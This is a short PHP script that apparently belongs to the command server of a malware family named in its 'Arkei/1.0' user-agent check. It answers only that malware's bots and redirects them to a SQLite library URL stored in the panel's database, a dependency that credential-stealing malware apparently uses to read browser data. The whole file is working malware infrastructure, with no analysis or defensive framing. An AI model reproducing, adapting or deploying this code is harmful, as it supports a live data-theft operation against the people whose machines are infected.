<?php

if($_SERVER["HTTP_USER_AGENT"] != "Arkei/1.0")
	exit(0);

require("../app/config.php");

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$get= $database->query("SELECT `Value` FROM `settings` WHERE `Name`='sqlite_lib_url'")->fetch_array();
	
	header('Location: '. $get["Value"]);
}
else
{
	exit(0);
}

?>